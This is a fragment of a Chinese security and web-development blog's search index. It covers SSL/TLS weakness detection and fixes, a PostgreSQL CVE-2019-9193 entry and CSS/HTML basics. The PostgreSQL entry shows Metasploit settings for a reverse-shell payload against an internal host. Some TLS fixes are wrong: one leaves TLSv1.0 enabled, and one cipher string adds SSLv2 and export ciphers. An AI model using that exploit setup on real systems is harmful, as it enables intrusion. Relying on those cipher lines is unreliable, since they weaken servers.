        <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">U2FsdGVkX189H0HRK7xLvoox+BX0QIY5paGX6wAigL3nPf0x13UnEx1xC6nCnlYJfkHRAztEwgNitvsqW30WoFnQNlZhT40A4Bn7+++N0nOaEAR+orx02N4VSL+3HowtXdJY49z7V+vqJb5331APk/Zn0QbhUx2IHN7Klh8BgOPRqNvsRBlkb0ptFhVzZuvLX5Mm3S9ZEPdaoLdyGr2Qt+TbBVgyXBHsmA6m7j93n73LDP6EHn5rpMCrQRB+4FELwtn1c6B2vVKgtjXVfMhwDyqo6z8Bjbq1l+X6lGjf4k0cGbGmJ6yGqHLhlkDYe+zgJtaYX8xegX5/xFirUQd6Gg8A6jK+TZxQg58veQ8N66ndkDY49O2G6iS1XugBfqRhYpPZQc+GE/notRVWdogku7xrYTpjBH1OO71fm3RGzU27CuCvYYZVNE2QHHmvfo7b0USR7cqL54R2NB2LuPw0TnAnZfECOknfKLiqX/rasR97DVVwnjonOas/hnDRrI+7bSGkJyJHPCHxrS7sewHW2DYRtaP+C4zoIvw8URS+d37yfshnfsigUSqN8hAGwz9GLamsmoq9jzRREKLX6ulAkPYtTuBxYYWNPtN/hG0sU6ilz9+KlAGxoKbEgQtHSH8LcRk0dNAX8ekJ53Aum0CouP12v5eldudxK9MJhAEPJ6Hdey4Oa4U7ivmtkEtghthL51h/Lq4vxoyipIhNPXd9p2slaEpvlJo2omrWjmFzM7uuapyQRvibUfMIT7xhw6hc0Heecvam6gdz/LC1vTB0ZOPl6/IE2pwEVtAw74zk1l8rfdLJlLyNPUuVjFq7ZfvGdFBUzuvVHQ1D8WxhGhMUleLHX1CF/9LRbSFO1vTgOmHM1O1AiKk7XO2cLvMYHu+djH6Yc1VPk3NjKDCuaJ24ofkTeOxxft2u7Vjgtb64yL5U54tD2k+Iaomiyt+uTRmV59BEa/GbjOCVSAdJvcuQCwKNPFAt4b+RAaEPKbqN7kAcxIslV3KO0C/zu1CbmBp64kH/DqLWEej9vZ/vFim1L1cGtoJJbk/q4eVTHGISsUGJE92xuWQOxeR8QofsgijcxtsuPF82N6sh2d/4GKr+64gD9gkAu0uvq9mwOQh08kr2j/RQZp8xfn2En9LI0EMSuQe8wu501LlE0+U5sMkMVvkVnzZp8frrwIuwcn01e8i/ByyFCxaOS4vkBTXcqnaFjbLH0EDJKtps6kBGJgdT1qCXxzp20tpNG9FgSIwBd9aSUMpiXHqyRC434OFmEjA/gQakuSa7+glKIkdX8lEp5cA8cyTxn6fr/6Iwn/XATBmusHiJb6fSn8ROVMRroOIKafbla6RGGTpg2SFLbz+UBDGERPX/bzx1KLApw7S9LoC1PSo+JNFqzZyUxN8+nTygoo4WrmheJKS1sLCod8Lx6ky7jkUPYPzEorpXIDtNOwR2C+BzFUklCanffMFGjNv52HRAE+lGSJkV5lohrOYpF9PRde/DQ6sV8xE7hjEtiClwZ4aP3yTZGWlJwagp5+t21UPMIXHX3Kb9W9gpCxCRx6HncUKpGTfokDMoD9wFS+sepk5QDzgAZd2PMKXRYYLmiIJSVOVRXb2R3hZK0iLRbexIna0ieJJdziP3X2TRAO9wMm70usklL4PN6AeMZHQ/</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSLTLS相关漏洞</title>
      <link href="Kali/Exploit/SSLTLS%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html"/>
      <url>Kali/Exploit/SSLTLS%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="TLSv1-0检测与修复"><a href="#TLSv1-0检测与修复" class="headerlink" title="TLSv1.0检测与修复"></a>TLSv1.0检测与修复</h2><p>TLS 1.0于1999年发行，该版本易受各种攻击（如BEAST和POODLE）已有多年，除此之外，支持较弱加密，对当今网络连接的安全已失去应有的保护效力。</p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><ul><li><p>nmap检测</p><pre><code class="shell">nmap --script ssl-enum-ciphers -p 443 www.target.com</code></pre></li><li><p>在线检测<br><a href="https://www.ssleye.com/cipher_suites.html">ssl协议与套件检测</a></p></li></ul><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul><li>Apache</li></ul><pre><code class="shell">sed -i &quot;s/^SSLProtocol.*/SSLProtocol all -SSLv1 -SSLv2 -SSLv3/g&quot;  /etc/httpd/conf.d/ssl.confsystemctl restart httpd</code></pre><ul><li>Nginx</li></ul><pre><code class="shell">sed -i &quot;s/^ssl_protocols.*/ssl_protocols TLSv1.2 TLSv1.3;/g&quot; /etc/nginx/nginx.conf/usr/nginx/sbin/nginx -s reload</code></pre><h2 id="SWEET32攻击-CVE-201602183"><a href="#SWEET32攻击-CVE-201602183" class="headerlink" title="SWEET32攻击 CVE-201602183"></a>SWEET32攻击 CVE-201602183</h2><p>使用64位块大小如3DES的传统分组密码当以CBC（密码分组链接）模式使用时易遭受碰撞攻击。当使用CBC模式时，简单的生日攻击就能识别出64位分组密码碰撞。当碰撞发生时意味着输入和输出是一样的，这样就可能发动BEAST方式的攻击提取加密数据。</p><pre><code class="zsh">./testssl.sh -W https://10.199.27.2 Testing for SWEET32 (Birthday Attacks on 64-bit Block Ciphers) SWEET32 (CVE-2016-2183, CVE-2016-6329)    VULNERABLE,uses 64 bit block ciphersnmap -sV --script ssl-enum-ciphers -p 443 10.199.27.1</code></pre><h3 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h3><p>参考链接：<br><a href="https://segmentfault.com/a/1190000038486902">CVE-2016-2183</a></p><ul><li>HTTPD<blockquote><p>/etc/httpd/conf.d/ssl.conf</p></blockquote><pre><code class="zsh">SSLCipherSuite HIGH:!aNULL:!MD5:!3DES;</code></pre></li><li>Nginx<blockquote><p>/usr/local/etc/nginx/nginx.conf</p></blockquote><pre><code class="zsh">ssl_ciphers HIGH:!aNULL:!MD5:!3DES;</code></pre></li></ul><h2 id="Logjam攻击-CVE-2015-4000"><a href="#Logjam攻击-CVE-2015-4000" class="headerlink" title="Logjam攻击 CVE-2015-4000"></a>Logjam攻击 CVE-2015-4000</h2><p>Logjam漏洞可帮助攻击者(中间人)将TLS连接降级为512位导出级加密。这有助于攻击者读取和修改通过网络连接传输的任何数据。</p><pre><code class="zsh">./testssl -J https://10.199.27.1Testing for LOGJAM vulnerability LOGJAM (CVE-2015-4000), experimental      VULNERABLE (NOT ok): common prime: RFC2409/Oakley Group 2 (1024 bits),                                           but no DH EXPORT ciphers</code></pre><h3 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h3><blockquote><p>/etc/httpd/conf.d/ssl.conf</p></blockquote><ul><li>HTTPD<pre><code class="zsh">SSLCipherSuite !EXPORT</code></pre></li></ul><blockquote><p>/usr/local/etc/nginx/nginx.conf</p></blockquote><ul><li>Nginx<pre><code class="zsh">ssl_ciphers &#39;!EXPORT&#39;; ssl_ciphers ALL:!aNULL:!EXPORT56:+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP:!RC4:!MD5:!3DES!:SSLv3;  # 或者这个#Note: - If you already have ssl_ciphers configured, you just need to add !EXPORT in existing line instead of adding new one.</code></pre></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>meta_learning</title>
      <link href="Evolution/meta_learning.html"/>
      <url>Evolution/meta_learning.html</url>
      
        <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none"></div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PostgreSQL</title>
      <link href="Kali/Exploit/PostgreSQL.html"/>
      <url>Kali/Exploit/PostgreSQL.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><strong>PostgreSQL</strong> 是目前功能最强大、特性最丰富和结构最复杂的开源数据库管理系统，是主流数据库中最符合SQL标准规范的实现。<br>PostgreSQL 的性能非常优秀，并且在极限压力的情况下依旧能保持稳定的性能。</p><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><pre><code class="zsh">nmap -Pn -sV -p5432 10.199.39.1Host is up (0.057s latency).PORT     STATE SERVICE    VERSION5432/tcp open  postgresql PostgreSQL DB 9.3.0 - 9.3.2Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds</code></pre><h2 id="PostgreSQL任意代码执行-CVE-2019-9193"><a href="#PostgreSQL任意代码执行-CVE-2019-9193" class="headerlink" title="PostgreSQL任意代码执行 CVE-2019-9193"></a>PostgreSQL任意代码执行 CVE-2019-9193</h2><p>存在版本：PostgreSQL&gt; = 9.3</p><pre><code class="zsh">Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):   Name               Current Setting  Required  Description   ----               ---------------  --------  -----------   DATABASE           template1        yes       The database to authenticate against   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)   PASSWORD           postgres         no        The password for the specified username. Leave blank for a random password.   RHOSTS             10.199.39.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT              5432             yes       The target port (TCP)   TABLENAME          YpVFJRRcUZ       yes       A table name that does not exist (To avoid deletion)   USERNAME           postgres         yes       The username to authenticate asPayload options (cmd/unix/reverse_perl):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen port</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>css_basic</title>
      <link href="Coding/JavaScript/css-basic.html"/>
      <url>Coding/JavaScript/css-basic.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li>[x]</li></ul><p><strong>CSS(Cascading Style Sheet)</strong> 层叠样式表,是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言。</p><p><a href="https://www.w3school.com.cn/tiy/t.asp">W3School TIY Editor</a></p><p>CSS引入方式</p><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;path/to/xx.css&quot; /&gt;</code></pre><p>CSS规则：</p><pre><code class="css">selector &#123;    style_name1: value1;    style_name2: value2;    ...&#125;</code></pre><h2 id="CSS基本样式"><a href="#CSS基本样式" class="headerlink" title="CSS基本样式"></a>CSS基本样式</h2><p>四种基础选择器</p><ul><li><strong>派生选择器</strong> 通过依据元素在其位置的上下文关系来定义样式，可以使标记更加简洁</li></ul><pre><code class="css">li strong &#123;    font-style: italic;    font-weight: normal;  &#125;</code></pre><ul><li><strong>id选择器</strong> id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式。以 “#” 来定义</li></ul><pre><code class="css">#pid &#123;  color: #00755f;&#125;</code></pre><ul><li><strong>类选择器</strong> 类可以为特定class属性的HTML元素指定特定的样式，以一个点号(.)定义</li></ul><pre><code class="css">.divclass &#123;  color: red;&#125;</code></pre><ul><li><strong>属性选择器</strong> 对带有指定属性的 HTML 元素设置样式。</li></ul><pre><code class="css">[title]&#123;color:red;&#125;</code></pre><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>重要属性</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>background-attachment</td><td>背景图像是否固定或者随着页面的其余部分滚动</td></tr><tr><td>background-color</td><td>设置元素的背景颜色</td></tr><tr><td>background-image</td><td>把图片设置为背景</td></tr><tr><td>background-position</td><td>设置背景图片的起始位置</td></tr><tr><td>background-repeat</td><td>设置背景图片是否及如何重复</td></tr></tbody></table><p>CSS3 背景</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>background-size</td><td>规定背景图片的尺寸</td></tr><tr><td>background-origin</td><td>规定背景图片的定位区域</td></tr><tr><td>background-clip</td><td>规定背景的绘制区域</td></tr></tbody></table><pre><code class="css">/* 把python.png设置为背景图片，但是不平铺 */body &#123;  background-image: url(&quot;python.png&quot;);  background-repeat: no-repeat;&#125;</code></pre><h3 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h3><p><strong>重要属性</strong></p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><code>color</code></td><td>文本颜色</td></tr><tr><td><code>direction</code></td><td>文本方向</td></tr><tr><td><code>line-height</code></td><td>行高</td></tr><tr><td><code>letter-spacing</code></td><td>字符间距</td></tr><tr><td><code>text-align</code></td><td>对齐元素中的文本</td></tr><tr><td><code>text-decoration</code></td><td>向文本添加修饰</td></tr><tr><td><code>text-indent</code></td><td>缩进元素中文本的首行</td></tr><tr><td><code>text-transform</code></td><td>元素中的字母</td></tr><tr><td><code>unicode-bidi</code></td><td>设置文本方向</td></tr><tr><td><code>white-space</code></td><td>元素中空白的处理方式</td></tr><tr><td><code>word-spacing</code></td><td>字间距</td></tr></tbody></table><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><strong><code>CSS</code>链接的四种状态</strong></p><ul><li><code>a:link</code> –普通的、未被访问的链接</li><li><code>a:visited</code> –用户已访问的链接</li><li><code>a:hover</code> –鼠标指针位于链接的上方</li><li><code>a:active</code> –链接被点击的时刻</li></ul><p><strong>注意事项</strong></p><ul><li><code>a:hover</code>必须位于<code>a:link</code>和<code>a:visited</code>之后</li><li><code>a:active</code>必须位于<code>a:hover</code>之后</li></ul><pre><code class="css">a:link &#123;color:#FF0000;&#125;        /* 未被访问的链接 */a:visited &#123;color:#00FF00;&#125;    /* 已被访问的链接 */a:hover &#123;color:#FF00FF;&#125;    /* 鼠标指针移动到链接上 */a:active &#123;color:#0000FF;&#125;    /* 正在被点击的链接 */</code></pre><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/cssref/pr_list-style.asp">list-style</a></td><td>简写属性。用于把所有用于列表的属性设置于一个声明中。</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_list-style-image.asp">list-style-image</a></td><td>将图象设置为列表项标志。</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_list-style-position.asp">list-style-position</a></td><td>设置列表中列表项标志的位置。</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_list-style-type.asp">list-style-type</a></td><td>设置列表项标志的类型。</td></tr><tr><td>marker-offset</td><td></td></tr></tbody></table><pre><code class="css">ul li &#123;    list-style-image : url(xxx.gif)&#125;</code></pre><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/cssref/pr_tab_border-collapse.asp">border-collapse</a></td><td>设置是否把表格边框合并为单一的边框。</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_tab_border-spacing.asp">border-spacing</a></td><td>设置分隔单元格边框的距离。</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_tab_caption-side.asp">caption-side</a></td><td>设置表格标题的位置。</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_tab_empty-cells.asp">empty-cells</a></td><td>设置是否显示表格中的空单元格。</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_tab_table-layout.asp">table-layout</a></td><td>设置显示单元、行和列的算法。</td></tr></tbody></table><pre><code class="css">table, th, td  &#123;  border: 1px solid blue;  &#125;</code></pre><h3 id="轮廓"><a href="#轮廓" class="headerlink" title="轮廓"></a>轮廓</h3><table><thead><tr><th>属性</th><th>描述</th><th>CSS</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/cssref/pr_outline.asp">outline</a></td><td>在一个声明中设置所有的轮廓属性。</td><td>2</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_outline-color.asp">outline-color</a></td><td>设置轮廓的颜色。</td><td>2</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_outline-style.asp">outline-style</a></td><td>设置轮廓的样式。</td><td>2</td></tr><tr><td><a href="https://www.w3school.com.cn/cssref/pr_outline-width.asp">outline-width</a></td><td>设置轮廓的宽度。</td><td>2</td></tr></tbody></table><pre><code class="css">#p1 &#123;  outline-color: #ff704d;  outline-style: groove;  outline-width: 10px;&#125;</code></pre><h2 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h2><p><img src="https://www.escapelife.site/images/web-css-rumen-jichu-3.png" alt="css-1.png"></p><h3 id="内边距padding"><a href="#内边距padding" class="headerlink" title="内边距padding"></a>内边距padding</h3><p><strong>内边距</strong></p><ul><li><code>padding</code>属性定义元素边框与元素内容之间的空白区域</li><li><code>padding</code>属性接受长度值或百分比值，但不允许使用负值</li><li>按照<strong>上、右、下、左</strong>的顺序分别设置各边的内边距</li></ul><p><strong>内边距的四个属性</strong></p><ul><li><code>padding-top</code></li><li><code>padding-right</code></li><li><code>padding-bottom</code></li><li><code>padding-left</code></li></ul><pre><code class="css">h1 &#123;  padding-top: 10px;  padding-right: 0.25em;  padding-bottom: 2ex;  padding-left: 20%;  &#125;</code></pre><h3 id="边框border"><a href="#边框border" class="headerlink" title="边框border"></a>边框border</h3><p><strong>边框</strong></p><ul><li>元素的边框(<code>border</code>)是围绕元素内容和内边距的一条或多条线</li><li>设置<code>border</code>属性可以规定元素边框的样式、宽度和颜色</li></ul><p><strong>边框样式</strong></p><ul><li><code>border-style</code>设置样式</li></ul><p><strong>边框宽度</strong></p><ul><li><code>border-width</code>需要设置边框的宽度</li><li><code>border-top-width</code></li><li><code>border-right-width</code></li><li><code>border-bottom-width</code></li><li><code>border-left-width</code></li></ul><p><strong>边框颜色</strong></p><ul><li><code>border-color</code>需要设置边框的颜色</li><li><code>border-top-color</code></li><li><code>border-right-color</code></li><li><code>border-bottom-color</code></li><li><code>border-left-color</code></li></ul><pre><code class="css">td &#123;  border-style: solid;  border-width: 15px 5px 15px 5px;&#125;border-style: dashed;border-top-width: 15px;border-right-width: 5px;border-bottom-width: 15px;border-left-width: 5px;border-color: blue rgb(25%, 35%, 45%) #909090 red;</code></pre><h3 id="外边距margin"><a href="#外边距margin" class="headerlink" title="外边距margin"></a>外边距margin</h3><p><strong>外边距</strong></p><ul><li>外边距就是围绕在内容框的区域，默认为透明的区域</li><li>同样，外边距也接受任何长度的单位、百分数，与内边距很相似</li><li><code>margin</code>的默认值是<code>0</code>，但是一般浏览器都会预定提供样式</li><li>对称复制</li></ul><p><strong>外边距的四个属性</strong></p><ul><li><code>margin-top</code></li><li><code>margin-right</code></li><li><code>margin-bottom</code></li><li><code>margin-left</code></li></ul><pre><code class="css">h2 &#123;  margin-top: 20px;  margin-right: 30px;  margin-bottom: 30px;  margin-left: 20px;  &#125;</code></pre><h3 id="外边距合并"><a href="#外边距合并" class="headerlink" title="外边距合并"></a>外边距合并</h3><p>外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。</p><p>当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。请看下图：</p><p><img src="https://www.w3school.com.cn/i/ct_css_margin_collapsing_example_1.gif"></p><p>当一个元素包含在另一个元素中时（假设没有内边距或边框把外边距分隔开），它们的上和/或下外边距也会发生合并。请看下图：</p><p><img src="https://www.w3school.com.cn/i/ct_css_margin_collapsing_example_2.gif"></p><h2 id="CSS定位"><a href="#CSS定位" class="headerlink" title="CSS定位"></a>CSS定位</h2><p>定位的基本思想很简单，它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。</p><h3 id="定位机制"><a href="#定位机制" class="headerlink" title="定位机制"></a>定位机制</h3><p><strong>CSS 有三种基本的定位机制</strong></p><ul><li>普通流</li><li>元素按照其在<code>HTML</code>中的位置顺序决定排布的过程。</li><li>浮动</li><li>浮动的框可以向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。</li><li>绝对定位:</li><li>绝对定位使元素的位置与文档流无关，因此不占据空间。这一点与相对定位不同，相对定位实际上被看作普通流定位模型的一部分，因为元素的位置相对于它在普通流中的位置。</li></ul><p><strong>定位属性</strong></p><ul><li><code>position</code>，将元素放在一个静态的、相对的、绝对的或固定的位置</li><li>通过对 <code>top</code>,<code>left</code>,<code>right</code>,<code>bottom</code> 这四个属性的赋值让元素向对应的方向偏移</li><li><code>overflow</code>设置元素溢出其区域发生的事情</li><li><code>clip</code> 设置元素的显示形状，多用于图片</li><li><code>vertical-align</code>设置元素的垂直对其方式</li><li><code>z-index</code>设置元素的堆叠顺序</li></ul><h3 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h3><p>设置为相对定位的元素框会偏移某个距离。元素仍然保持其未定位前的形状，它原本所占的空间仍保留。</p><pre><code class="css">#box_relative &#123;  position: relative;  left: 30px;  top: 20px;&#125;</code></pre><h3 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h3><p>设置为绝对定位的元素框从文档流完全删除，并相对于其包含块定位，包含块可能是文档中的另一个元素或者是初始包含块。<br>元素原先在正常文档流中所占的空间会关闭，就好像该元素原来不存在一样。 元素定位后生成一个块级框，而不论原来它在正常流中生成何种类型的框。</p><pre><code class="css">#box_relative &#123;  position: absolute;  left: 30px;  top: 20px;&#125;</code></pre><h3 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h3><p>浮动的框可以向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。<br>由于浮动框不在文档的普通流中，所以文档的普通流中的块框表现得就像浮动框不存在一样。</p><p><strong><code>float</code>属性可以赋值如下</strong></p><ul><li><code>left：</code>元素向左浮动</li><li><code>right：</code>元素向右浮动</li><li><code>none：</code>不浮动</li><li><code>inherit：</code>从父级继承浮动的属性</li><li><code>clear：</code>主要用于去掉向各方向的浮<pre><code></code></pre></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>html_basic</title>
      <link href="Coding/JavaScript/html-basic.html"/>
      <url>Coding/JavaScript/html-basic.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><strong>HTML(Hyper Text Markup Language)</strong> 是一种用来制作超文本文件的简单标记语言，用HTML编写的超文本文件成为html文件，它能独立于各种操作系统平台。  </p><p><a href="https://www.w3school.com.cn/tiy/t.asp">W3School TIY Editor</a></p><pre><code class="html">&lt;html&gt;  &lt;head&gt;  &lt;!--头部信息--&gt;  &lt;/head&gt;  &lt;body&gt;  &lt;!--文件主题---&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="层标签"><a href="#层标签" class="headerlink" title="层标签"></a>层标签<div></h2><pre><code class="html">&lt;div id=&quot;&quot; align=&quot;&quot; style=&quot;&quot; class=&quot;&quot;&gt;...&lt;/div&gt;</code></pre><h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><h3 id="标题与段落"><a href="#标题与段落" class="headerlink" title="标题与段落"></a>标题与段落</h3><pre><code class="html">&lt;h1&gt;Typography&lt;/h1&gt;&lt;h2&gt;History&lt;/h2&gt;&lt;p&gt;Thomas identified the victim only as a 32-year-old woman.&lt;/p&gt;&lt;br /&gt; &lt;!-- 换行---&gt;&lt;hr /&gt;&lt;!-- 水平分割线&gt;</code></pre><p><img src="../images/html-1.png" alt="html-1"></p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><p>href的写法</p><pre><code class="html">&lt;a href=&quot;http://www.w3.org/index.html&quot;&gt;W3C&lt;/a&gt;&lt;a href=&quot;//www.w3.org/index.html&quot;&gt;W3C&lt;/a&gt;&lt;a href=&quot;mailto:askding@qq.com?Subject=我有疑问&quot;&gt;W3C&lt;/a&gt;&lt;a href=&quot;ftp://ftp.pku.edu.cn&quot;&gt;跳转到FTP&lt;/a&gt;&lt;a href=&quot;telnet://10.1.1.1&quot;&gt;Telnet到10.1.1.1&lt;/a&gt;&lt;a href=&quot;a/b/c.html&quot;&gt;相对路径&lt;/a&gt;&lt;a href=&quot;../../c.html&quot;&gt;相对路径&lt;/a&gt;</code></pre><p>页面内锚点</p><pre><code class="html">&lt;p 